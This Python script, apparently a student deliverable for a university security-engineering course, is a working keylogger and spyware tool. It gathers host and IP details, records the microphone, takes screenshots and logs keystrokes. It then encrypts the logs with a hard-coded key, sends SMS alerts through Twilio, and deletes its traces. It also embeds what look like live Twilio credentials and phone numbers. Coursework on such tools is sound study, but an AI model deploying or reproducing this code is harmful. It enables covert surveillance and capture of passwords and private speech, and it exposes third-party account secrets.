#Written by Vandana Rao Emaneni z5451278
#Code References are taken from Udemy Courses, Youtube Tutorials

#Functions to interact with OS
import os
#Functions to work with time
import time
#Functions to perform socket programming - to connect 2 nodes in a network to communicate
import socket
#To secure and accept passwords 
import getpass
#Get information related to the platform on which the program is running
import platform
#Record and play audio signals
import sounddevice as sd
#Functions to optimise signal strengths
from scipy.io.wavfile import write
#Make get/post netwrok requests
from requests import get
#Copy contents of screen for screenshots
from PIL import ImageGrab
#Twilio Data related libraries
from twilio.rest import Client
#For encryption & decryption, implementation of symmetric authenticated crypto
from cryptography.fernet import Fernet
#Control and monitor input devices (mouse, keyboard)
from pynput.keyboard import Key, Listener

#Files setup
keys_information = "key_log.txt"
system_information = "syseminfo.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

#Encrypted Files setup
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"

#Audio setup
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

#Twilio Account setup
account_sid = "AC0960b5d0c34e7b0606ffcafe1cd85fbd"
auth_token ="dbfe2e69a6b62a2d5f38c24c70daaecf"
client = Client(account_sid, auth_token)
username = getpass.getuser()

#Encryption key setup : Generate and paste the key from the encryption-decryption folder
key = "w4eLP7fMuJwYoRJyqbpfkn2LSQNWYiDNy2KooG26SSE="

#File path destination to store the generated files
file_path = "/Users/van/Documents/UNSW/Courses/Year 1/Y1 Term 3/COMP6441 - Security Engineering/UNSW-T3-COMP6441/Assignments/Final Deliverable/Advanced Keylogger"
extend = "/"
file_merge = file_path + extend

#System Information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
computer_information()

def microphone():
    fs = 48000
    seconds = microphone_time
    print("Devices available:",sd.query_devices())
    sd.query_devices()
    sd.default.device = 'MacBook Air Microphone'
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording)
microphone()

#Screenshots 
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
screenshot()

#Setup of number of times the keylogger must run
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration
#3 iterations
while number_of_iterations < number_of_iterations_end:
    print("currentTime, stoppingTime",currentTime,stoppingTime)
    count = 0
    keys =[]
    def on_press(key):
        global keys, count, currentTime
        print("Key:",key)
        keys.append(key)
        count += 1
        currentTime = time.time()
        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()
    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    if currentTime > stoppingTime:
        # with open(file_path + extend + keys_information, "w") as f:
        #     f.write(" ")
        screenshot() 
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

#Encryption of files
files_to_encrypt = [file_merge + system_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + keys_information_e]
count = 0
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read() 
    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)
    with open(encrypted_file_names[count], 'wb') as f:
        print("Encrypted data files created to be sent :",encrypted_file_names[count])
        f.write(encrypted)
        print("Encrypted data :",encrypted)
    #Send an SMS to say that the encrypted files are sent to the data server
    message = client.messages \
    .create(
        body='Encrypted files sent to the server! Login to your account to access!',
        from_='+12512209380',
        to='+61402821360'
    )
    print("Message ID",message.sid)
    count += 1

#Clean up any tracks of activity done from system
delete_files = [system_information, keys_information, screenshot_information, audio_information]
for file in delete_files:
    print("Removing trace of file:",file)
    os.remove(file_merge + file)